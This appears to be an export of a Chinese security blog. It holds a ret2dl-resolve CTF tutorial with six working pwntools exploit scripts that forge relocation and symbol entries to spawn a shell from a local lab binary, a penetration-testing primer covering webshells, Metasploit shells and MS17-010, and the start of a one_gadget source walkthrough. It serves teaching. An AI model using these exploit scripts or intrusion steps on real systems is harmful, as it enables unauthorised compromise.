采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定 当程序执行call read@plt时，实际会跳到0x804a010去执行。而0x080483a0处的汇编代码仅仅三行，第一行中0x804a010为read的 GOT 表位置，第一次调用read时，对应的 GOT 表中并没有放read的真实地址，而是read@plt的下一条指令地址； 12assassinq&gt;&gt; x/wx 0x804a0100x804a010: 0x080483a6 第二行和第三行把reloc_arg=0x8作为参数放进栈里，然后跳到0x8048380（PLT[0]）继续执行； 123assassinq&gt;&gt; x/2i 0x080483a6 0x80483a6 &lt;read@plt+6&gt;: push 0x8 0x80483ab &lt;read@plt+11&gt;: jmp 0x8048380 接下来PLT[0]再把link_map=*(GOT+4)（即GOT[1]，链接器的标识信息）作为参数推入栈中，而*(GOT+8)（即GOT[2]，动态链接器中的入口点）中保存的是_dl_runtime_resolve函数的地址； 123assassinq&gt;&gt; x/2i 0x8048380 0x8048380: push DWORD PTR ds:0x804a004 0x8048386: jmp DWORD PTR ds:0x804a008 因此以上指令相当于执行了_dl_runtime_resolve(link_map, reloc_arg)，该函数会完成符号的解析，即将真实的read函数地址写入其GOT条目中，随后把控制权交给read函数 1234567891011121314assassinq&gt;&gt; x/wx 0x804a0080x804a008: 0xf7fee000assassinq&gt;&gt; x/11i 0xf7fee000 0xf7fee000 &lt;_dl_runtime_resolve&gt;: push eax 0xf7fee001 &lt;_dl_runtime_resolve+1&gt;: push ecx 0xf7fee002 &lt;_dl_runtime_resolve+2&gt;: push edx 0xf7fee003 &lt;_dl_runtime_resolve+3&gt;: mov edx,DWORD PTR [esp+0x10] 0xf7fee007 &lt;_dl_runtime_resolve+7&gt;: mov eax,DWORD PTR [esp+0xc] 0xf7fee00b &lt;_dl_runtime_resolve+11&gt;: call 0xf7fe77e0 &lt;_dl_fixup&gt; 0xf7fee010 &lt;_dl_runtime_resolve+16&gt;: pop edx 0xf7fee011 &lt;_dl_runtime_resolve+17&gt;: mov ecx,DWORD PTR [esp] 0xf7fee014 &lt;_dl_runtime_resolve+20&gt;: mov DWORD PTR [esp],eax 0xf7fee017 &lt;_dl_runtime_resolve+23&gt;: mov eax,DWORD PTR [esp+0x4] 0xf7fee01b &lt;_dl_runtime_resolve+27&gt;: ret 0xc _dl_fixup在dl-runtime.c中实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif struct link_map *l, ElfW(Word) reloc_arg)&#123; const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目 const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; const ElfW(Sym) *refsym = sym; void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we're really looking at a PLT relocation. */// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7 assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123; const struct r_found_version *version = NULL; if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123; const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff; version = &amp;l-&gt;l_versions[ndx]; if (version-&gt;hash == 0) version = NULL; &#125; /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) &#123; THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; &#125;#ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL;#endif// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL;#endif /* Currently result contains the base load address (or link map) of the object that defines sym. Now add in the symbol offset. */// value为libc基址加上要解析函数的偏移地址，也即实际地址 value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false)); &#125; else &#123; /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; &#125; /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value;// 最后把value写入相应的GOT表条目中 return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125; Pwned One by One 控制eip为PLT[0]的地址，只需传递一个index_arg参数 控制index_arg的大小，使reloc的位置落在可控地址（比如.bss段）内 伪造reloc的内容，使sym落在可控地址（比如.bss段）内 伪造sym的内容，使name落在可控地址（比如.bss段）内 伪造name为任意库函数，比如说system 接下来一步一步地实现对dl-resolve的利用 Step one先实现一个 ROP 直接返回write@plt，然后输出我们设定的参数 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'payload = flat([ write_plt, 0xdeadbeef, 1, buf + 80, len(cmd)])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 最后会输出buf + 80上的字符串/bin/sh： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 7067[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Two第二次直接返回PLT[0]，要带上write的index_offset。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofindex_offset = 0x20payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd)])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 最后同样也是输出/bin/sh： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 7270[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Three接下来我们在.bss上构造假的reloc，并让dl-runtime.c来解析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltr_info = 0x607fake_reloc = p32(write_got) + p32(r_info)payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd), fake_reloc])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 最后得到相同的结果： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 8237[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Four这一次构造假的.sym，使其指向我们控制的st_name 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltdynsym = 0x080481d8 # readelf -S ./bof | grep \".dynsym\"dynstr = 0x08048278 # readelf -S ./bof | grep \".dynstr\"fake_sym_addr = buf + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = flat([ st_name, 0, 0, 0x12])payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd), fake_reloc, 'A' * align, fake_sym])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 因为dynsym里的Elf32_Sym结构体都是0x10字节大小，所以这里需要对齐操作；因为Elf32_Sym结构体的大小为0x10，所以要除以0x10才能得到write的dynsym索引号。最后成功运行： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 9736[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Five接下来一步把st_name指向输入的字符串&quot;write&quot;： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltdynsym = 0x080481d8 # readelf -S ./bof | grep \".dynsym\"dynstr = 0x08048278 # readelf -S ./bof | grep \".dynstr\"fake_sym_addr = buf + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = flat([ st_name, 0, 0, 0x12])payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd), fake_reloc, 'A' * align, fake_sym, 'write\\x00'])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 中间stname的位置因为Elf32_Sym的大小为0x10，所以要加0x10。结果成功： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 9778[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Six最后一步将write改成system，同时设置一下system的参数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltdynsym = 0x080481d8 # readelf -S ./bof | grep \".dynsym\"dynstr = 0x08048278 # readelf -S ./bof | grep \".dynstr\"fake_sym_addr = buf + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = flat([ st_name, 0, 0, 0x12])payload = flat([ plt_0, index_offset, 0xdeadbeef, buf + 80, 0xdeadbeef, 0xdeadbeef, fake_reloc, 'A' * align, fake_sym, 'system\\x00'])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 成功 Get Shell： 1234567891011121314λ ./exp.py[+] Starting local process './bof': pid 9948[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode$ lsbof bof.c core exp.py Makefile peda-session-bof.txt$ iduid=1000(assassinq) gid=1000(assassinq) groups=1000(assassinq),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker) Complement: 64 bit64 位下的利用相较于 32 位下有一些不同，像是一些结构体发生变化，如Elf64_Rela，还有其他的都在这篇文章中都详细地介绍了 Referenceshttp://pwn4.fun/2016/11/09/Return-to-dl-resolve/http://www.inforsec.org/wp/?p=389http://drops.wooyun.org/binary/14360http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://phrack.org/issues/58/4.html#article","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"渗透测试基础指南","slug":"渗透测试基础指南","date":"2019-08-04T08:17:53.000Z","updated":"2019-08-26T05:55:08.042Z","comments":true,"path":"2019/08/04/渗透测试基础指南/","link":"","permalink":"blog.b3ale.cn/2019/08/04/渗透测试基础指南/","excerpt":"记录一下渗透测试的基础步骤。","text":"记录一下渗透测试的基础步骤。 Penetration test渗透测试即利用我们所掌握的渗透知识，对网站进行一步一步的渗透，发现其中存在的漏洞和隐藏的风险，然后撰写一篇测试报告，提供给客户。客户根据我们撰写的测试报告，对网站进行漏洞修补，以防止黑客的入侵。 渗透测试的前提是经过用户的授权，才可以对网站进行渗透。如果我们没有经过客户的授权而对一个网站进行渗透测试的话是违法的。2016 年 6 月 1 日，我国颁布了《中华人民共和国网络安全法》，对网络犯罪有了法律约束。 渗透测试分为白盒测试和黑盒测试： 白盒测试：在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码审计 黑盒测试：只告诉我们这个网站的 url，其他什么都不告诉，模拟黑客对网站的渗透 接下来记录一下黑盒测试的几个步骤 Information Gathering（信息收集） 主动信息收集：通过直接访问、扫描网站，这种流量将流经网站 被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google 搜索、Shodan 搜索等 DNS 域名信息的收集 整站分析 服务器类型(Linux/Windows) 网站容器(Apache/Nginx/Tomcat/IIS) 脚本类型(php/jsp/asp/aspx) 数据库类型(Mysql/Oracle/Accees/Mqlserver) 主机扫描(Nessus) 端口扫描(nmap) 网站敏感目录和文件 旁站和 C 段扫描 网站漏洞扫描 Vulnerability Detection（漏洞探测）探测网站是否存在一些常见的 Web 漏洞： SQL 注入 XSS 跨站脚本 CSRF 跨站请求伪造 XXE 漏洞 SSRF 服务端请求伪造漏洞 文件包含漏洞 文件上传漏洞 文件解析漏洞 远程代码执行漏洞 CORS 跨域资源共享漏洞 越权访问漏洞 目录浏览漏洞和任意文件读取/下载漏洞 struts2 漏洞 JAVA 反序列化漏洞 … Vulnerability Exploitation（漏洞利用）当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的 webshell，我们往往需要结合几个漏洞来拿 webshell。 SQL 注入：Sqlmap XSS 跨站脚本：BeEF 抓包改包工具：Burpsuite、Fidder 文件上传漏洞：上传一句话木马，进而获得 webshell 提权：获得了 webshell 后，一般权限很低，所以需要提权，可以选择反弹一个 MSF 类型的 shell 提权，也可以使用其他提权（Windows 提权、Linux 下用 SUID 提权） Intranet forwarding（内网转发）当我们获取到了网站的 Webshell 之后，如果我们是想获取该主机的有关信息，我们可以将该主机的 webshell 换成 MSF 的 shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个 MSF 类型的 shell。 如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发。我们不能直接和内网的主机通信，所以就需要借助获取到的 webshell 网站的服务器和内网主机进行通信。 Intranet Penetration（内网渗透）当能跟内网主机进行通信后，就可以开始进行内网渗透。可以先使用nmap对内网主机进行扫描，探测在线的主机，并且探测其使用的操作系统、开放的端口等信息。 内网用户基本都是使用的 windows 系统，而且大多数是使用的 windows7，在 windows7 中有很多漏洞，比如 MS17_010 这种漏洞，我们可以使用Metasploit Framework探测其 windows 系统是否存在这种漏洞，如果有这种漏洞，直接拿 shell。 企业内网大多数是一个域环境，所以我们只需要找到域控服务器，并拿下其权限，就可以登录其他所有用户的主机。 当然，内网中也有可能存在供内网使用的内网服务器，我们可以进一步渗透拿下其权限。 Report Writing（撰写渗透测试报告）完成渗透测试之后，需要对这次渗透测试撰写渗透测试报告。明确地写出哪里存在漏洞，以及漏洞修补的方法，以便于网站管理员根据渗透测试报告修补这些漏洞和风险，防止被黑客攻击。 ComplementIP 配置直接在文件中配置123456sudo vim /etc/network/interfaces# auto eth0 # 自动启用第一块网卡# ifconf eth0 inet static# address 192.168.1.2 # IP地址# netmask 255.255.255.0 # 子网掩码# gateway 192.168.1.1 # 网关 命令行配置1234sudo ifconfig ens33 192.168.10.163 netmask 255.255.255.0 # 设置IP和掩码sudo route add default gw 192.168.10.1 # 设置网关sudo echo \"nameserver 192.168.10.1\" &gt;&gt; /etc/resolv.conf # 设置DNSsudo /etc/init.d/networking restart # 重启服务 Common Vulnerabilities输入输出验证不充分 输入输出验证 SQL 注入 跨站脚本攻击（XSS） 跨站请求伪造（CSRF） 文件上传常见问题 文件下载漏洞 设计缺陷 非授权对象引用 纵向越权 找回密码漏洞 环境缺陷 解析漏洞 IIS 5.x/6.0 解析漏洞 IIS 7.0/IIS 7.5/ Nginx &lt;8.03 畸形解析漏洞 Nginx &lt;8.03 空字节代码执行漏洞 Apache 解析漏洞 其他 Referenceshttps://blog.csdn.net/qq_36119192/article/details/84674109https://blog.csdn.net/wsclinux/article/details/73177091http://blog.nsfocus.net/common-vulnerability-verify/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"one_gadget源码分析","slug":"one-gadget源码分析","date":"2019-05-16T01:44:57.000Z","updated":"2019-08-26T05:52:16.792Z","comments":true,"path":"2019/05/16/one-gadget源码分析/","link":"","permalink":"blog.b3ale.cn/2019/05/16/one-gadget源码分析/","excerpt":"不清楚one_gadget具体原理是什么，打算看一下源码，做了一点草率的分析。","text":"不清楚one_gadget具体原理是什么，打算看一下源码，做了一点草率的分析。 Structure目录结构大概是这样： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122$ tree.├── Gemfile├── Gemfile.lock├── LICENSE├── README.md├── README.tpl.md├── Rakefile├── appveyor.yml├── bin│ └── one_gadget├── builds_list├── examples│ ├── aarch64.png│ ├── from_build_id.png│ ├── i386.png│ ├── near.png│ ├── script.png│ └── x86_64.png├── lib│ ├── one_gadget│ │ ├── abi.rb│ │ ├── builds│ │ │ ├── libc-2.19-01e14462fc6097604edd54a2ee63664c65b2c12b.rb│ │ │ ├── ...│ │ │ ├── libc-2.19-fe76e177d397e9bdccf270232cc7e3a06e84aeb1.rb│ │ │ ├── libc-2.20-024df4febc9c789a8eeb052385d5e780b98a379f.rb│ │ │ ├── ...│ │ │ ├── libc-2.20-f53b8ad377a1988dcf6329bbdfa7b1201431656e.rb│ │ │ ├── libc-2.21-04f18629ef42b062ed0c8f60d5bfaa40a7d28ef7.rb│ │ │ ├── ...│ │ │ ├── libc-2.21-fe668be19c2dadb3cef5e6eafb6796acabf0b8f1.rb│ │ │ ├── libc-2.21.90-d8785e62882096798b9a47645c401e2db0c3da87.rb│ │ │ ├── libc-2.21.90-ec2edee6fe6141b914f74b6d3541e986c1995420.rb│ │ │ ├── libc-2.22-056b23405739592e947a92cb210791fbfe9d9938.rb│ │ │ ├── ...│ │ │ ├── libc-2.22-ff7fbdaaef014460825b4ef5848e86834aa3880c.rb│ │ │ ├── libc-2.23-012683a92d161c37d51d89711c4870ba30904c3d.rb│ │ │ ├── ...│ │ │ ├── libc-2.23-ffb3662a7bc5e136fa8f464fc14ec23efb8d1817.rb│ │ │ ├── libc-2.23.90-203feaf8a7e40cef8a75568a406a22fdeda94f8b.rb│ │ │ ├── ...│ │ │ ├── libc-2.23.90-f149edaf4dee34b38f831bf0914af2ecf0a1a317.rb│ │ │ ├── libc-2.24-024385baa7aaf9c62ae336e896bcf245dda0fc01.rb│ │ │ ├── ...│ │ │ ├── libc-2.24-fe976940471b3f683eeebb268f095b7ff1c898c1.rb│ │ │ ├── libc-2.25-58c735bc7b19b0aeb395cce70cf63bd62ac75e4a.rb│ │ │ ├── ...│ │ │ ├── libc-2.25-eae5038c2b9ae67d9eda345aa9fbe0a7185ab436.rb│ │ │ ├── libc-2.26-1c39b3b3faa2a2cbb0fa0b6845b29332562262d3.rb│ │ │ ├── ...│ │ │ ├── libc-2.26-fb587bc4429e7d1b0de31a3b9ee8ae78ee797eb0.rb│ │ │ ├── libc-2.27-0e188ec5f09c187a7a92784d4b97aa251b15a93c.rb│ │ │ ├── ...│ │ │ ├── libc-2.27-b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0.rb│ │ │ ├── libc-2.28-44f5a3efb0e5733fa9d97e690cb36cd4c682bcdb.rb│ │ │ ├── ...│ │ │ └── libc-2.28-6ee9454b96efa9e343f9e8105f2fa4529265ea05.rb│ │ ├── cli.rb│ │ ├── emulators│ │ │ ├── aarch64.rb│ │ │ ├── amd64.rb│ │ │ ├── i386.rb│ │ │ ├── instruction.rb│ │ │ ├── lambda.rb│ │ │ ├── processor.rb│ │ │ └── x86.rb│ │ ├── error.rb│ │ ├── fetcher.rb│ │ ├── fetchers│ │ │ ├── aarch64.rb│ │ │ ├── amd64.rb│ │ │ ├── base.rb│ │ │ ├── i386.rb│ │ │ └── x86.rb│ │ ├── gadget.rb│ │ ├── helper.rb│ │ ├── logger.rb│ │ ├── one_gadget.rb│ │ ├── update.rb│ │ └── version.rb│ └── one_gadget.rb├── one_gadget.gemspec├── spec│ ├── bin_spec.rb│ ├── cli_spec.rb│ ├── data│ │ ├── aarch64-libc-2.23.so│ │ ├── aarch64-libc-2.24.so│ │ ├── aarch64-libc-2.27.so│ │ ├── filename$with+special&amp;keys│ │ ├── libc-2.19-cf699a15caae64f50311fc4655b86dc39a479789.so│ │ ├── libc-2.19-fd51b20e670e9a9f60dc3b06dc9761fb08c9358b.so│ │ ├── libc-2.23-60131540dadc6796cab33388349e6e4e68692053.so│ │ ├── libc-2.23-926eb99d49cab2e5622af38ab07395f5b32035e9.so│ │ ├── libc-2.24-8cba3297f538691eb1875be62986993c004f3f4d.so│ │ ├── libc-2.26-2104f3d4ad5cf68603afbe7ba1a17f5ac99c5988.so│ │ ├── libc-2.26-ddcc13122ddbfe5e5ef77d4ebe66d124ae5762c2.so│ │ ├── libc-2.26-f65648a832414f2144ce795d75b6045a1ec2e252.so│ │ ├── libc-2.27-63b3d43ad45e1b0f601848c65b067f9e9b40528b.so│ │ ├── libc-2.27-b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0.so│ │ └── test_near_file.elf│ ├── emulators│ │ ├── aarch64_spec.rb│ │ ├── amd64_spec.rb│ │ ├── i386_spec.rb│ │ ├── instruction_spec.rb│ │ └── lambda_spec.rb│ ├── gadget_spec.rb│ ├── helper_spec.rb│ ├── one_gadget_aarch64_spec.rb│ ├── one_gadget_amd64_spec.rb│ ├── one_gadget_i386_spec.rb│ ├── spec_helper.rb│ └── update_spec.rb└── tasks ├── builds │ ├── generate.rake │ └── list.rake └── readme.rake12 directories, 787 files Analysis以下的分析仅仅是我个人的想法，因为我也不了解 ruby，只是单纯地推测代码的含义。如果有错误，欢迎大佬指正。接下来我逐个按照文件来进行分析： bin存放了one_gadget可执行文件 123456#!/usr/bin/env ruby# frozen_string_literal: truerequire 'one_gadget/cli'exit OneGadget::CLI.work(ARGV.dup) 也可以看出lib/one_gadget/cli.rb中肯定调用了具体的算法 examples不同架构下one_gadget的执行效果图 liblib下分为一个one_gadget的文件夹和一个源文件one_gadget.rb one_gadget这里应该就是one_gadget的源码，先看lib/one_gadget/cli.rb，其中定义了一个work函数，也就是二进制文件中调用的部分： 12345678910111213141516171819202122... # Main method of CLI. # @param [Array&lt;String&gt;] argv # Command line arguments. # @return [Boolean] # Whether the command execute successfully. # @example # CLI.work(%w[--help]) # # usage message # #=&gt; true # CLI.work(%w[--version]) # # version message # #=&gt; true # @example # CLI.work([]) # # usage message # #=&gt; false # @example # CLI.work(%w[-b b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0 -r]) # # 324293 324386 1090444 # #=&gt; true... 看一下注释大概知道了就是解析输入的参数，然后再对不同的函数进行调用 lib/one_gadget/helper.rb中定义了对输入文件信息的一些判断和一些美化操作，以architecture函数为例，就是对使用的指令架构做了一个判断： 123456789101112131415161718192021222324# Fetch the ELF archiecture of +file+.# @param [String] file The target ELF filename.# @return [Symbol]# Currently supports amd64, i386, arm, aarch64, and mips.# @example# Helper.architecture('/bin/cat')# #=&gt; :amd64def architecture(file) return :invalid unless File.exist?(file) f = 